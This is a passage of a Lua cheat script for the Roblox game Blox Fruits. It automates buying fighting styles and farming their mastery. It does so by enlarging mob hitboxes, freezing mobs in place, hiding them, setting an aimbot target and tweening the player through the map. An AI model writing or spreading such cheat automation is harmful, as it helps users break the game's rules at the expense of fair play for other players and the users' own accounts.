                                        if _G.GodhumanWeaponSelected == "Black Leg" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Electro") and _G.GodhumanInfo['Electro'] and _G.GodhumanInfo['Electro'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Electro") and not LP.Character:FindFirstChild("Electro") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Electro"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Electro'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Electro") or LP.Character:FindFirstChild("Electro") then
                                            if LP.Backpack:FindFirstChild("Electro") then
                                                _G.GodhumanInfo["Electro"] = LP.Backpack:FindFirstChild("Electro").Level.Value
                                            elseif LP.Character:FindFirstChild("Electro") then
                                                _G.GodhumanInfo["Electro"] = LP.Character:FindFirstChild("Electro").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Electro"] = false
                                        end
                                    else
                                        if _G.GodhumanWeaponSelected == "Electro" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Fishman Karate") and _G.GodhumanInfo['Fishman Karate'] and _G.GodhumanInfo['Fishman Karate'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Fishman Karate") and not LP.Character:FindFirstChild("Fishman Karate") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Fishman Karate"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Fishman Karate'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Fishman Karate") or LP.Character:FindFirstChild("Fishman Karate") then
                                            if LP.Backpack:FindFirstChild("Fishman Karate") then
                                                _G.GodhumanInfo["Fishman Karate"] = LP.Backpack:FindFirstChild("Fishman Karate").Level.Value
                                            elseif LP.Character:FindFirstChild("Fishman Karate") then
                                                _G.GodhumanInfo["Fishman Karate"] = LP.Character:FindFirstChild("Fishman Karate").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Fishman Karate"] = false
                                        end
                                    else
                                        if _G.GodhumanWeaponSelected == "Fishman Karate" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Dragon Claw") and _G.GodhumanInfo['Dragon Claw'] and _G.GodhumanInfo['Dragon Claw'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Dragon Claw") and not LP.Character:FindFirstChild("Dragon Claw") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Dragon Claw"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Dragon Claw'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Dragon Claw") or LP.Character:FindFirstChild("Dragon Claw") then
                                            if LP.Backpack:FindFirstChild("Dragon Claw") then
                                                _G.GodhumanInfo["Dragon Claw"] = LP.Backpack:FindFirstChild("Dragon Claw").Level.Value
                                            elseif LP.Character:FindFirstChild("Dragon Claw") then
                                                _G.GodhumanInfo["Dragon Claw"] = LP.Character:FindFirstChild("Dragon Claw").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Dragon Claw"] = false
                                        end
                                    else
                                        if _G.GodhumanWeaponSelected == "Dragon Claw" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if _G.GodhumanInfo["Black Leg"] >= 400 and _G.GodhumanInfo["Electro"] >= 400 and _G.GodhumanInfo["Fishman Karate"] >= 400 and _G.GodhumanInfo["Dragon Claw"] >= 400 then
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Superhuman") and _G.GodhumanInfo['Superhuman'] and _G.GodhumanInfo['Superhuman'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Superhuman") and not LP.Character:FindFirstChild("Superhuman") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Superhuman"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Superhuman'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Superhuman") or LP.Character:FindFirstChild("Superhuman") then
                                                if LP.Backpack:FindFirstChild("Superhuman") then
                                                    _G.GodhumanInfo["Superhuman"] = LP.Backpack:FindFirstChild("Superhuman").Level.Value
                                                elseif LP.Character:FindFirstChild("Superhuman") then
                                                    _G.GodhumanInfo["Superhuman"] = LP.Character:FindFirstChild("Superhuman").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Superhuman"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Superhuman" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                end
                                if _G.GodhumanInfo["Black Leg"] >= 400 and _G.GodhumanInfo["Electro"] >= 400 and _G.GodhumanInfo["Fishman Karate"] >= 400 and _G.GodhumanInfo["Dragon Claw"] >= 400 and _G.GodhumanInfo["Superhuman"] >= 400 then
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Death Step") and _G.GodhumanInfo['Death Step'] and _G.GodhumanInfo['Death Step'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Death Step") and not LP.Character:FindFirstChild("Death Step") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Death Step"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Death Step'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Death Step") or LP.Character:FindFirstChild("Death Step") then
                                                if LP.Backpack:FindFirstChild("Death Step") then
                                                    _G.GodhumanInfo["Death Step"] = LP.Backpack:FindFirstChild("Death Step").Level.Value
                                                elseif LP.Character:FindFirstChild("Death Step") then
                                                    _G.GodhumanInfo["Death Step"] = LP.Character:FindFirstChild("Death Step").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Death Step"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Death Step" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Sharkman Karate") and _G.GodhumanInfo['Sharkman Karate'] and _G.GodhumanInfo['Sharkman Karate'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Sharkman Karate") and not LP.Character:FindFirstChild("Sharkman Karate") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Sharkman Karate"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Sharkman Karate'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Sharkman Karate") or LP.Character:FindFirstChild("Sharkman Karate") then
                                                if LP.Backpack:FindFirstChild("Sharkman Karate") then
                                                    _G.GodhumanInfo["Sharkman Karate"] = LP.Backpack:FindFirstChild("Sharkman Karate").Level.Value
                                                elseif LP.Character:FindFirstChild("Sharkman Karate") then
                                                    _G.GodhumanInfo["Sharkman Karate"] = LP.Character:FindFirstChild("Sharkman Karate").Level.Value
                                                end
                                            else
                                                if second_sea then
                                                    FarmWaterKeyGH = true
                                                else
                                                    teleportToSecondSea()
                                                end
                                                _G.GodhumanInfo["Sharkman Karate"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Sharkman Karate" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Electric Claw") and _G.GodhumanInfo['Electric Claw'] and _G.GodhumanInfo['Electric Claw'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Electric Claw") and not LP.Character:FindFirstChild("Electric Claw") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Electric Claw"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Electric Claw'] then
                                            if useNearestEntrance(CFrame.new(-389.768494, 331.860565, 685.700256, 0.992786944, -4.46675372e-08, -0.119891919, 4.67511327e-08, 1, 1.45662709e-08, 0.119891919, -2.00662864e-08, 0.992786944)) then
                                                StopTween()
                                            end
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start")
                                            wait(1)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Electric Claw") or LP.Character:FindFirstChild("Electric Claw") then
                                                if LP.Backpack:FindFirstChild("Electric Claw") then
                                                    _G.GodhumanInfo["Electric Claw"] = LP.Backpack:FindFirstChild("Electric Claw").Level.Value
                                                elseif LP.Character:FindFirstChild("Electric Claw") then
                                                    _G.GodhumanInfo["Electric Claw"] = LP.Character:FindFirstChild("Electric Claw").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Electric Claw"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Electric Claw" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Dragon Talon") and _G.GodhumanInfo['Dragon Talon'] and _G.GodhumanInfo['Dragon Talon'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Dragon Talon") and not LP.Character:FindFirstChild("Dragon Talon") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Dragon Talon"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Dragon Talon'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                            wait(.08)
                                            if not LP.Backpack:FindFirstChild("Dragon Talon") and not LP.Character:FindFirstChild("Dragon Talon") then
